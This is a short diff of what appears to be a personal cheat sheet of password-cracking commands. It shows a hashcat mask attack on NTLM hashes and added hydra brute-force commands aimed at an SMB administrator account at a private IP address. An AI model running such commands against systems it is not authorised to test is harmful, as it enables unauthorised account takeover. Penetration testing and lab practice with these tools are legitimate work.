@@ -17,3 +17,12 @@ hashcat --force --hwmon-temp-abort=100 -m 1000 -D 1,2 -a 3 -i --increment-min 5 
  
  a | ?l?u?d?s
  b | 0x00 - 0xff
+
+
+
+hydra -P wifite.txt -l administrator smb://192.168.50.200 -m "ROOT.DC"
+
+
+Brute char!!!! -x min:max:Aa1%
+
+hydra -x 7:8:1 -l administrator smb://192.168.50.200 -m "ROOT.DC" -V
